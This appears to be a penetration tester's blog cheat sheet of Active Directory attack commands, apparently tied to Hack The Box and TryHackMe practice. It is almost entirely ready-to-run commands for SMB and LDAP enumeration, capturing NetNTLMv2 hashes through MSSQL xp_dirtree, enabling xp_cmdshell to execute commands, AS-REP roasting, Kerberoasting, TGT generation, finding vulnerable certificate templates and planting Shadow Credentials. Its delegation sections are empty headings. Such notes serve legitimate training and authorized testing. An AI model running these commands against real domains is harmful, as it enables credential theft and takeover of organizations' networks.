---
title: "CheatSheet - Active Directory Attacks"
author: Nasrallah
description: ""
date: 2025-07-21 07:00:00 +0000
categories : [CheatSheet]
tags: [CheatSheet, windows]
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## **SMB**

```bash
nxc smb 10.10.10.10 -u user -p password
```

```bash
nxc smb 10.10.10.10 -u user -p password --user --shares -M spider_plus
```

## **LDAP**

```bash
ldapsearch -H 'ldap://htb.local/' -x -b "dc=htb,dc=local" '(objectClass=person)'
```

## MSSQL

### XP_DIRTREE

List a directory

```shell
exec master.sys.xp_dirtree 'c:\', 1, 1;
```

Get NetNTMLv2 hash

```bash
xp_dirtree \\10.10.10.10\share
```

### Command execution

Check admin privileges 1=true=admin

```bash
SELECT is_srvrolemember('sysadmin');
```

Enable `xp_cmdshell`

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```bash
enable_xp_cmdshell
```

Executing commands.

```bash
xp_cmdshell "whoami"
```

```bash
nxc mssql manager.htb -u operator -p operator -x whoami
```

```bash
nxc mssql domain.local -u user -p pass -q 'ELECT name FROM master.dbo.sysdatabases;'
```

## **Attacking Kerberos**

### **AS-Rep Roasting**

```bash
nxc ldap 10.10.10.161 -u '' -p ''  --asreproast hashes.txt
```

```bash
GetNPUsers.py 'htb.local/' -usersfile users.txt -no-pass -dc-ip 10.10.10.161
```

```shell
rubeus.exe asreproast /format:hashcat /nowrap
```

### **Kerberoasting**

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.10 'DOMAIN/user:password' -outputfile hashes.txt
```

```bash
nxc ldap 10.10.10.10. -u user -p password --kerberoasting hashes.txt
```

```shell
rubeus.exe kerberoast /nowrap
```

### **Pass The Ticket**

#### Generating TGTs

```bash
getTGT.py 'domain.local/user' -dc-ip 10.10.11.45 -p 'password'
```

```bash
nxc smb domain -u user -p password --generate-tgt
```

## AD CS

[AD CS - Privilege-Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

```bash
certipy find -vulnerable -u user -p password -dc-ip 10.10.11.72 -stdout
```

```shell
certify.exe find /vulnerable
```

```bash
nxc ldap 10.10.10.10 -u user -p pass -M adcs
```

## Shadow Credentials

### Windows

```shell
Whisker.exe add /target:sflowers /password:siriussirius /path:cert.pfx
```

```shell
Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:"siriussirius" /domain:domain.local /dc:DC.domain.local /getcredentials /show
```

### Linux

```bash
certipy shadow auto -account {target_user} -u 'user@domain.local' -p 'password' -dc-ip 10.129.135.59
```

```bash
bloodyAD --host domain.local -d domain.local -u user -p password add shadowCredentials {target_user}
```

## Delegation

### Constrained Delegation

### Unconstrained Delegation

### Resource Based Constrained Delegation

## **References**

<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation>
